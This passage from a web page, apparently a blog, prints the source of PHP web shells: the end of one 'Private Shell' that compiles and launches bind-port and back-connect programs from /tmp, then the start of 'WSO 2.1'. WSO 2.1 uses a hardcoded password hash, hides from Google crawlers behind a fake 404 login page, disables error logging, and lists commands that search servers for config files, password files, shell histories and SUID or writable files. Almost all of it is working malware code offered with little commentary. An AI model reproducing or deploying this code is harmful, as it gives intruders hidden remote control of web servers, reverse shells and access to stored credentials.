<span class="lineno">1380</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpc&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1381</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.c&quot;</span><span class="p">,</span><span class="nv">$bind_port_c</span><span class="p">);</span> 
<span class="lineno">1382</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;gcc -o /tmp/bp /tmp/bp.c&quot;</span><span class="p">);</span> 
<span class="lineno">1383</span>             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.c&quot;</span><span class="p">);</span> 
<span class="lineno">1384</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;/tmp/bp &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1385</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1386</span>         <span class="p">}</span> 
<span class="lineno">1387</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bpp&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1388</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bp.pl&quot;</span><span class="p">,</span><span class="nv">$bind_port_p</span><span class="p">);</span> 
<span class="lineno">1389</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; /tmp/bp.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1390</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bp.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1391</span>         <span class="p">}</span> 
<span class="lineno">1392</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcc&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1393</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.c&quot;</span><span class="p">,</span><span class="nv">$back_connect_c</span><span class="p">);</span> 
<span class="lineno">1394</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;gcc -o /tmp/bc /tmp/bc.c&quot;</span><span class="p">);</span> 
<span class="lineno">1395</span>             <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.c&quot;</span><span class="p">);</span> 
<span class="lineno">1396</span>             <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;/tmp/bc &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1397</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1398</span>         <span class="p">}</span> 
<span class="lineno">1399</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;bcp&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1400</span>             <span class="nx">cf</span><span class="p">(</span><span class="s2">&quot;/tmp/bc.pl&quot;</span><span class="p">,</span><span class="nv">$back_connect_p</span><span class="p">);</span> 
<span class="lineno">1401</span>             <span class="nv">$out</span> <span class="o">=</span> <span class="nx">ex</span><span class="p">(</span><span class="nx">which</span><span class="p">(</span><span class="s2">&quot;perl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; /tmp/bc.pl &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; &amp;&quot;</span><span class="p">);</span> 
<span class="lineno">1402</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;pre class=ml1&gt;</span><span class="si">$out\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="s2">&quot;ps aux | grep bc.pl&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1403</span>         <span class="p">}</span> 
<span class="lineno">1404</span>     <span class="p">}</span> 
<span class="lineno">1405</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1406</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1407</span> <span class="p">}</span> 
<span class="lineno">1408</span> <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno">1409</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span> 
<span class="lineno">1410</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span> 
<span class="lineno">1411</span>     <span class="k">else</span> 
<span class="lineno">1412</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SecInfo&#39;</span><span class="p">;</span> 
<span class="lineno">1413</span> <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span> 
<span class="lineno">1414</span>     <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;action&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span> 
<span class="lineno">1415</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1416</span> <span class="x">&lt;a href=&quot;http://www.devilscafe.in&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://images.cooltext.com/1380134.gif&quot; /&gt;&lt;/a&gt;&lt;div id=&quot;cot_tl_fixed&quot;&gt;&lt;marquee&gt;Private Shell - (c)oded by Lagipre-dz ~ (e)dited by Minhal Mehdi&lt;/marquee&gt;&lt;/div&gt; </span>
<span class="lineno">1417</span> <span class="x">www.devilscafe.in &lt;/marquee&gt;&lt;/div&gt;</span></code></pre></div>

<p>Here&#8217;s another version of the same shell script: WSO 2.1 (by pgems.in this time)</p>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span> 
<span class="lineno">   2</span> <span class="cm">/* WSO 2.1 (Web Shell by pgems.in) */</span> 
<span class="lineno">   3</span> <span class="cm">/*Subhashdasyam.com*/</span>
<span class="lineno">   4</span> <span class="nv">$auth_pass</span> <span class="o">=</span> <span class="s2">&quot;36028fcd4abb97e9e4f47d929ddc9980&quot;</span><span class="p">;</span> 
<span class="lineno">   5</span> <span class="nv">$color</span> <span class="o">=</span> <span class="s2">&quot;#00ff00&quot;</span><span class="p">;</span> 
<span class="lineno">   6</span> <span class="nv">$default_action</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span> 
<span class="lineno">   7</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;SELF_PATH&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">);</span> 
<span class="lineno">   8</span> <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span><span class="s1">&#39;Google&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">   9</span>     <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 404 Not Found&#39;</span><span class="p">);</span> 
<span class="lineno">  10</span>     <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">  11</span> <span class="p">}</span> 
<span class="lineno">  12</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span> 
<span class="lineno">  13</span> <span class="o">@</span><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  14</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;error_log&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">);</span> 
<span class="lineno">  15</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;log_errors&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  16</span> <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;max_execution_time&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  17</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  18</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="lineno">  19</span> <span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">&#39;VERSION&#39;</span><span class="p">,</span> <span class="s1">&#39;2.1&#39;</span><span class="p">);</span> 
<span class="lineno">  20</span> <span class="k">if</span><span class="p">(</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  21</span>     <span class="k">function</span> <span class="nf">stripslashes_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  22</span>         <span class="k">return</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">)</span> <span class="o">?</span> <span class="nb">array_map</span><span class="p">(</span><span class="s1">&#39;stripslashes_array&#39;</span><span class="p">,</span> <span class="nv">$array</span><span class="p">)</span> <span class="o">:</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span> 
<span class="lineno">  23</span>     <span class="p">}</span> 
<span class="lineno">  24</span>     <span class="nv">$_POST</span> <span class="o">=</span> <span class="nx">stripslashes_array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span> 
<span class="lineno">  25</span> <span class="p">}</span> 
<span class="lineno">  26</span> <span class="k">function</span> <span class="nf">printLogin</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">  27</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">  28</span> <span class="x">&lt;h1&gt;Not Found&lt;/h1&gt; </span>
<span class="lineno">  29</span> <span class="x">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; </span>
<span class="lineno">  30</span> <span class="x">&lt;hr&gt; </span>
<span class="lineno">  31</span> <span class="x">&lt;address&gt;Apache Server at </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x"> Port 80&lt;/address&gt; </span>
<span class="lineno">  32</span> <span class="x">    &lt;style&gt; </span>
<span class="lineno">  33</span> <span class="x">        input { margin:0;background-color:#fff;border:1px solid #fff; } </span>
<span class="lineno">  34</span> <span class="x">    &lt;/style&gt; </span>
<span class="lineno">  35</span> <span class="x">    &lt;center&gt; </span>
<span class="lineno">  36</span> <span class="x">    &lt;form method=post&gt; </span>
<span class="lineno">  37</span> <span class="x">    &lt;input type=password name=pass&gt; </span>
<span class="lineno">  38</span> <span class="x">    &lt;/form&gt;&lt;/center&gt; </span>
<span class="lineno">  39</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">  40</span>     <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">  41</span> <span class="p">}</span> 
<span class="lineno">  42</span> <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="p">))</span> 
<span class="lineno">  43</span>     <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="o">||</span> 
<span class="lineno">  44</span>         <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$auth_pass</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> 
<span class="lineno">  45</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">  46</span>     <span class="k">else</span> 
<span class="lineno">  47</span>         <span class="nx">printLogin</span><span class="p">();</span> 
<span class="lineno">  48</span> 
<span class="lineno">  49</span> <span class="k">if</span><span class="p">(</span> <span class="nb">strtolower</span><span class="p">(</span> <span class="nb">substr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;win&quot;</span> <span class="p">)</span> 
<span class="lineno">  50</span>     <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;win&#39;</span><span class="p">;</span> 
<span class="lineno">  51</span> <span class="k">else</span> 
<span class="lineno">  52</span>     <span class="nv">$os</span> <span class="o">=</span> <span class="s1">&#39;nix&#39;</span><span class="p">;</span> 
<span class="lineno">  53</span> <span class="nv">$safe_mode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span> 
<span class="lineno">  54</span> <span class="nv">$disable_functions</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span> 
<span class="lineno">  55</span> <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno">  56</span> <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> 
<span class="lineno">  57</span>     <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span> 
<span class="lineno">  58</span> <span class="nv">$cwd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno">  59</span> <span class="k">if</span><span class="p">(</span> <span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">  60</span>     <span class="nv">$home_cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$home_cwd</span><span class="p">);</span> 
<span class="lineno">  61</span>     <span class="nv">$cwd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">);</span> 
<span class="lineno">  62</span> <span class="p">}</span> 
<span class="lineno">  63</span> <span class="k">if</span><span class="p">(</span> <span class="nv">$cwd</span><span class="p">[</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cwd</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span> <span class="p">)</span> 
<span class="lineno">  64</span>     <span class="nv">$cwd</span> <span class="o">.=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno">  65</span>      
<span class="lineno">  66</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> 
<span class="lineno">  67</span>     <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno">  68</span>         <span class="s2">&quot;List Directory&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir&quot;</span><span class="p">,</span> 
<span class="lineno">  69</span>         <span class="s2">&quot;Find index.php in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir /s /w /b index.php&quot;</span><span class="p">,</span> 
<span class="lineno">  70</span>         <span class="s2">&quot;Find *config*.php in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;dir /s /w /b *config*.php&quot;</span><span class="p">,</span> 
<span class="lineno">  71</span>         <span class="s2">&quot;Show active connections&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">,</span> 
<span class="lineno">  72</span>         <span class="s2">&quot;Show running services&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net start&quot;</span><span class="p">,</span> 
<span class="lineno">  73</span>         <span class="s2">&quot;User accounts&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net user&quot;</span><span class="p">,</span> 
<span class="lineno">  74</span>         <span class="s2">&quot;Show computers&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;net view&quot;</span><span class="p">,</span> 
<span class="lineno">  75</span>         <span class="s2">&quot;ARP Table&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;arp -a&quot;</span><span class="p">,</span> 
<span class="lineno">  76</span>         <span class="s2">&quot;IP Configuration&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;ipconfig /all&quot;</span> 
<span class="lineno">  77</span>     <span class="p">);</span> 
<span class="lineno">  78</span> <span class="k">else</span> 
<span class="lineno">  79</span>     <span class="nv">$aliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> 
<span class="lineno">  80</span>           <span class="s2">&quot;List dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;ls -la&quot;</span><span class="p">,</span> 
<span class="lineno">  81</span>         <span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">,</span> 
<span class="lineno">  82</span>           <span class="s2">&quot;show opened ports&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">,</span> 
<span class="lineno">  83</span>         <span class="s2">&quot;Find&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> 
<span class="lineno">  84</span>           <span class="s2">&quot;find all suid files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  85</span>           <span class="s2">&quot;find suid files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">,</span>
<span class="lineno">  86</span>           <span class="s2">&quot;find all sgid files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  87</span>           <span class="s2">&quot;find sgid files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">,</span>
<span class="lineno">  88</span>           <span class="s2">&quot;find config.inc.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">,</span> 
<span class="lineno">  89</span>           <span class="s2">&quot;find config* files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> 
<span class="lineno">  90</span>           <span class="s2">&quot;find config* files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">,</span> 
<span class="lineno">  91</span>           <span class="s2">&quot;find all writable folders and files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  92</span>           <span class="s2">&quot;find all writable folders and files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">,</span> 
<span class="lineno">  93</span>           <span class="s2">&quot;find all service.pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">,</span> 
<span class="lineno">  94</span>           <span class="s2">&quot;find service.pwd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">,</span> 
<span class="lineno">  95</span>           <span class="s2">&quot;find all .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">,</span> 
<span class="lineno">  96</span>           <span class="s2">&quot;find .htpasswd files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">,</span> 
<span class="lineno">  97</span>           <span class="s2">&quot;find all .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">,</span> 
<span class="lineno">  98</span>           <span class="s2">&quot;find .bash_history files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">,</span> 
<span class="lineno">  99</span>           <span class="s2">&quot;find all .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">,</span> 
<span class="lineno"> 100</span>           <span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">,</span> 
<span class="lineno"> 101</span>         <span class="s2">&quot;Locate&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> 
<span class="lineno"> 102</span>           <span class="s2">&quot;locate httpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 103</span>         <span class="s2">&quot;locate vhosts.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate vhosts.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 104</span>         <span class="s2">&quot;locate proftpd.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 105</span>         <span class="s2">&quot;locate psybnc.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 106</span>         <span class="s2">&quot;locate my.conf files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span> 
<span class="lineno"> 107</span>         <span class="s2">&quot;locate admin.php files&quot;</span> <span class="o">=&gt;</span><span class="s2">&quot;locate admin.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 108</span>         <span class="s2">&quot;locate cfg.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate cfg.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 109</span>         <span class="s2">&quot;locate conf.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate conf.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 110</span>         <span class="s2">&quot;locate config.dat files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.dat&quot;</span><span class="p">,</span> 
<span class="lineno"> 111</span>         <span class="s2">&quot;locate config.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 112</span>         <span class="s2">&quot;locate config.inc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc&quot;</span><span class="p">,</span> 
<span class="lineno"> 113</span>         <span class="s2">&quot;locate config.inc.php&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.inc.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 114</span>         <span class="s2">&quot;locate config.default.php files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config.default.php&quot;</span><span class="p">,</span> 
<span class="lineno"> 115</span>         <span class="s2">&quot;locate config* files &quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate config&quot;</span><span class="p">,</span> 
<span class="lineno"> 116</span>         <span class="s2">&quot;locate .conf files&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;locate &#39;.conf&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 117</span>         <span class="s2">&quot;locate .pwd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.pwd&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 118</span>         <span class="s2">&quot;locate .sql files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.sql&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 119</span>         <span class="s2">&quot;locate .htpasswd files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.htpasswd&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 120</span>         <span class="s2">&quot;locate .bash_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.bash_history&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 121</span>         <span class="s2">&quot;locate .mysql_history files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.mysql_history&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 122</span>         <span class="s2">&quot;locate .fetchmailrc files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate &#39;.fetchmailrc&#39;&quot;</span><span class="p">,</span> 
<span class="lineno"> 123</span>         <span class="s2">&quot;locate backup files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate backup&quot;</span><span class="p">,</span> 
